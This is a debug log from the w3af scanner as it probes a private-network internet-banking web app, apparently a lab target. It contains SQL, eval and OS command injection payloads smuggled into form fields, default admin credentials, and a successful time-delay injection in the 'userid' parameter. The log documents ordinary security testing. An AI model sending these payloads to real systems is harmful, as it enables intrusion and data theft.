[Fr 20 Nov 2015 21:33:27 CET - information] Enabling redos's dependency server_header
[Fr 20 Nov 2015 21:33:27 CET - information] Enabling dav's dependency allowed_methods
[Fr 20 Nov 2015 21:33:29 CET - information] Enabling frontpage's dependency frontpage_version
[Fr 20 Nov 2015 21:33:34 CET - debug] Called w3afCore.start()
[Fr 20 Nov 2015 21:33:34 CET - debug] Enabling _dns_cache()
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ] plugins
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ]     audit file_upload, eval, un_ssl, os_commanding, lfi, sqli, preg_replace, mx_injection, generic, format_string, websocket_hijacking, shell_shock, memcachei, ldapi, buffer_overflow, redos, global_redirect, xpath, cors_origin, htaccess_methods, dav, ssi, csrf, xss, ssl_certificate, xst, blind_sqli, phishing_vector, response_splitting, rfd, rfi, frontpage
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=2&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4729,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=admin&password=qwerty" returned HTTP code "302" (id=4728,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4730,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=Thread.sleep(3000);&userid=1&email=1@2.com" returned HTTP code "200" (id=4731,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709573597136) 7.52287423611 > 0.225420951843 > 2.83079175154
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709573597136) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "balance" for 3 seconds using <ExactDelay (fmt:Thread.sleep(%s);, delta:0, mult:1000)>, response wait time was: 0.225420951843 seconds.
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=d%27kc%22z%27gj%27%22%2A%2A5%2A%28%28%28%3B-%2A%60%29&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4732,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4733,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=Test01!&trancode=1);waitfor delay '0:0:3'--&purpose=any p..." returned HTTP code "200" (id=4734,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709178516368) 7.70015323162 > 0.177412986755 > 2.81109408538
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709178516368) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "trancode" for 3 seconds using <ExactDelay (fmt:1);waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.177412986755 seconds.
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=95%20AND%2095%3D96%20&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4735,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=Thread.sleep%283000%29%3B with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4736,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709178517008) 7.59256196022 > 0.186962842941 > 2.82304867109
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709178517008) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "account" for 3 seconds using <ExactDelay (fmt:Thread.sleep(%s);, delta:0, mult:1000)>, response wait time was: 0.186962842941 seconds.
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=2&trancode=1' or pg_sleep(3) and '1'='1&purpose=any purpo..." returned HTTP code "200" (id=4737,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709567659280) 7.70877832174 > 0.149721860886 > 2.81013574203
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709567659280) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "trancode" for 3 seconds using <ExactDelay (fmt:1' or pg_sleep(%s) and '1'='1, delta:0, mult:1)>, response wait time was: 0.149721860886 seconds.
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4738,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=2&trancode=FIz8lnVojgXNhZp&purpose=run ping -n 4 localhos..." returned HTTP code "200" (id=4739,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709587952912) 7.39284074306 > 0.15247297287 > 2.84523991744
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709587952912) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "purpose" for 3 seconds using <Command (OS: windows, Separator: "run ", Command: "run ping -n %s localhost")>, response wait time was: 0.15247297287 seconds.
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4740,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=Thread.sleep%283000%29%3B&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4741,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709181357456) 7.56673103571 > 0.120848178864 > 2.82591877381
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709181357456) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "action" for 3 seconds using <ExactDelay (fmt:Thread.sleep(%s);, delta:0, mult:1000)>, response wait time was: 0.120848178864 seconds.
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=admin&password=qwerty" returned HTTP code "302" (id=4742,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=Test01!&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4743,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4744,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4745,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=9rPx6elo&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4746,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4747,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=Test01!&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4748,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=ping%20-c%204%20localhost&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4749,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709587094672) 7.56086450815 > 0.153647184372 > 2.82657061021
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709587094672) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "action" for 3 seconds using <Command (OS: unix, Separator: "", Command: "ping -c %s localhost")>, response wait time was: 0.153647184372 seconds.
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=2&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4750,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4751,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=admin&password=1'));waitfor delay '0:0:3'--" returned HTTP code "200" (id=4752,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709181356048) 7.49141478539 > 0.101027965546 > 2.83428724607
[Fr 20 Nov 2015 21:50:15 CET - debug] (Test id: 140709181356048) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/login.php - parameter "password" for 3 seconds using <ExactDelay (fmt:1'));waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.101027965546 seconds.
[Fr 20 Nov 2015 21:50:15 CET - debug] Updating socket timeout for 192.168.2.130 from 3.62339835614 to 4.41042584181 seconds
[Fr 20 Nov 2015 21:50:15 CET - debug] Created 5 mutants for "Method: POST | http://192.168.2.130/InternetBanking/employee.php | URL encoded form: (email, balance, userid)" (post data: 3, query string: 2)
[Fr 20 Nov 2015 21:50:21 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:21 CET - debug] ExtendedUrllib error rate is at 3%
[Fr 20 Nov 2015 21:50:21 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/client.php?action=online" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:21 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:21 CET - debug] ExtendedUrllib error rate is at 4%
[Fr 20 Nov 2015 21:50:21 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:21 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:21 CET - debug] ExtendedUrllib error rate is at 5%
[Fr 20 Nov 2015 21:50:21 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/client.php?action=online" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:21 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:21 CET - debug] ExtendedUrllib error rate is at 6%
[Fr 20 Nov 2015 21:50:21 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:21 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/login.php". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:21 CET - debug] ExtendedUrllib error rate is at 7%
[Fr 20 Nov 2015 21:50:21 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/login.php" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:22 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:22 CET - debug] ExtendedUrllib error rate is at 8%
[Fr 20 Nov 2015 21:50:22 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/client.php?action=online" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:22 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=%5E%28%23%24%21%40%23%24%29%28%28%29%29%29%2A%2A%2A%2A%2A%2A". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:22 CET - debug] ExtendedUrllib error rate is at 9%
[Fr 20 Nov 2015 21:50:22 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=%5E%28%23%24%21%40%23%24%29%28%28%29%29%29%2A%2A%2A%2A%2A%2A&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:22 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:22 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:22 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:22 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=account&account=^(#$!@#$)(()))******" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:22 CET - debug] ExtendedUrllib error rate is at 10%
[Fr 20 Nov 2015 21:50:22 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=^(#$!@#$)(()))******&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:22 CET - debug] ExtendedUrllib error rate is at 11%
[Fr 20 Nov 2015 21:50:22 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:22 CET - debug] ExtendedUrllib error rate is at 12%
[Fr 20 Nov 2015 21:50:22 CET - debug] GET http://192.168.2.130/ returned HTTP code "200" (id=4753,from_cache=0,grep=0)
[Fr 20 Nov 2015 21:50:22 CET - debug] Remote URL http://192.168.2.130/ is reachable
[Fr 20 Nov 2015 21:50:22 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:22 CET - debug] ExtendedUrllib error rate is at 13%
[Fr 20 Nov 2015 21:50:22 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:23 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:23 CET - debug] ExtendedUrllib error rate is at 14%
[Fr 20 Nov 2015 21:50:23 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:24 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:24 CET - debug] ExtendedUrllib error rate is at 15%
[Fr 20 Nov 2015 21:50:25 CET - error] The blind_sqli plugin got an error while requesting "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:25 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:25 CET - debug] ExtendedUrllib error rate is at 16%
[Fr 20 Nov 2015 21:50:25 CET - error] The os_commanding plugin got an error while requesting "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:25 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:25 CET - debug] ExtendedUrllib error rate is at 17%
[Fr 20 Nov 2015 21:50:25 CET - error] The blind_sqli plugin got an error while requesting "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:25 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:25 CET - debug] ExtendedUrllib error rate is at 18%
[Fr 20 Nov 2015 21:50:25 CET - error] The eval plugin got an error while requesting "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:25 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/login.php". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:25 CET - debug] ExtendedUrllib error rate is at 19%
[Fr 20 Nov 2015 21:50:25 CET - error] The blind_sqli plugin got an error while requesting "http://192.168.2.130/InternetBanking/login.php". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 20%
[Fr 20 Nov 2015 21:50:26 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 21%
[Fr 20 Nov 2015 21:50:26 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/client.php?action=online" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 22%
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] GET http://192.168.2.130/ returned HTTP code "200" (id=4759,from_cache=0,grep=0)
[Fr 20 Nov 2015 21:50:26 CET - debug] Remote URL http://192.168.2.130/ is reachable
[Fr 20 Nov 2015 21:50:26 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 23%
[Fr 20 Nov 2015 21:50:26 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=d'kc"z'gj'"**5*(((;-*`)&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 24%
[Fr 20 Nov 2015 21:50:26 CET - debug] Re-sending request "<HTTPRequest "http://192.168.2.130/InternetBanking/employee.php?action=95" OR "95"="95&account=1" (cookies:True, cache:False)>" after initial exception: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 25%
[Fr 20 Nov 2015 21:50:26 CET - error] The os_commanding plugin got an error while requesting "http://192.168.2.130/InternetBanking/client.php?action=online". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=%5E%28%23%24%21%40%23%24%29%28%28%29%29%29%2A%2A%2A%2A%2A%2A&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 26%
[Fr 20 Nov 2015 21:50:26 CET - error] The ldapi plugin got an error while requesting "http://192.168.2.130/InternetBanking/employee.php?action=^(#$!@#$)(()))******&account=1". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=%5E%28%23%24%21%40%23%24%29%28%28%29%29%29%2A%2A%2A%2A%2A%2A". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 27%
[Fr 20 Nov 2015 21:50:26 CET - error] The ldapi plugin got an error while requesting "http://192.168.2.130/InternetBanking/employee.php?action=account&account=^(#$!@#$)(()))******". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 28%
[Fr 20 Nov 2015 21:50:26 CET - error] The ldapi plugin got an error while requesting "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] Failed to HTTP "POST" "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error", going to retry.
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 28%
[Fr 20 Nov 2015 21:50:26 CET - error] The ldapi plugin got an error while requesting "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] ExtendedUrllib error rate is at 28%
[Fr 20 Nov 2015 21:50:26 CET - error] The ldapi plugin got an error while requesting "http://192.168.2.130/InternetBanking/employee.php?action=account&account=1". Reason: "HTTP timeout error"
[Fr 20 Nov 2015 21:50:26 CET - debug] Created 25 mutants for "Method: POST | http://192.168.2.130/InternetBanking/employee.php | URL encoded form: (email, balance, userid)" (post data: 15, query string: 10)
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=sleep(6);&email=1@2.com" returned HTTP code "200" (id=4766,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:27 CET - debug] (Test id: 140709182353488) 12.6534277797 > 12.0321090221 > 5.92739691337
[Fr 20 Nov 2015 21:50:27 CET - debug] (Test id: 140709182353488) Successfully controlled HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "userid" for 6 seconds using <ExactDelay (fmt:sleep(%s);, delta:0, mult:1)>, response wait time was: 12.0321090221 seconds.
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4767,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=2&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4768,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4769,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:27 CET - debug] Not enough samples collected (22) to adjust timeout. Keeping the current value of 4.41042584181 seconds
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=TXDnAIAfKgClWkWOXUCVqbsfeQpTRUYiwZYVVOiGIAzkCYXGVFdtgjIIJPkMsScDPshYlUJvQcdUfnmlpbuqhqnFIEAhfCxzuLyiIdJifrFXWFUIENDuusmszsNeiBDIKJcumPqNiHhwvZyIjGrfaMmfOyBdFHnERWcyHKbxBJrlPoNFxxqmqQPxKkNVjYkRPJkOjoJoLMKCFDAZWdXoYDNhnRRhFvGhYfsQlOJsWLPRtDhoEuXgGtZbtgEjajRehjQngSCZSWnUicKtrmBcQZWdnkoINPXxhYqtvToTmEympGUKvnBhfenGbSdllTNQrQkdKLFCKUYadOLUTwgkBJYxcorObrxaFVjSUkYmRrvYwUuhiGlucVVvpypThxoKtZkvOBOVJZQtkFkfONWsdQuOhUxbXbYeqVgUOKBYZEOarJqqDFLiWSETdtEsQlbNMSgukPeuWaVZdbnswynDgXDxoYJdwzNKxZYhaLoofXbAWcqyljJxvNlSpNCMCxJVOqvCiaEHWeEhMuIgvlZlTZMcoyXeOzoTFQtcMqzoupcUapFplEFSFLhvbROQaFvfSxdshsSgPMjCvnXfOBRgzAmVyEvJLXGPnLESNgahHMCwAEKnIpDtvCfCKwhRcQEGRaIiWqJFDrZsXhOdkWwZqPFYuXqaJmeRgEVKjuserGSHrHFAUzsxaTpQVcDjVEoHBsZWMmrMrjcOmXPRjUEzgoNoRyUBaRIJqIDwYPJbURmKdxOEQBMprJdQbvRKrQFwatgroJvAwVOxDCLKYMUSQaviYVskWPFXVfQuFQeSneyFhSEYjikXmAfBrlpSotjVSYitpMACooWRONTjHsenDQdRFGfqYZeMsbkuYmbJzvlZBcKHkGHsvYvdefMzPMLSxprIPKveTgZPixIgsbpbOmxrFIhKiKWeTueCXwBPmCoNIXYpXWDyzRaPAHKIAUdoWQzesFJAosiLaJVHrCmwWPJpaBIbOmfjINWmgSoxSLsboAtrXulrZXDfVBlTgKgFD with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4770,from_cache=0,grep=1)
